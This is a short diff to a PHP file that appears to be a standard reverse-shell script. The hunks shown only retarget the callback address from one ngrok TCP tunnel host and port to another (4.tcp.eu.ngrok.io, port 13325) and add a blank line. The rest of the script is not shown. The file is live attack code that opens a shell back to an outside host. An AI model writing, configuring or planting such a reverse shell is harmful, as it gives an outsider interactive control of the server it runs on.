@@ -4,8 +4,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '2.tcp.eu.ngrok.io';
-$port = 12545;
+$ip = '4.tcp.eu.ngrok.io';
+$port = 13325;
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -112,5 +112,6 @@ function printit ($string) {
 		print "$string\n";
 	}
 }
+
 
 ?>
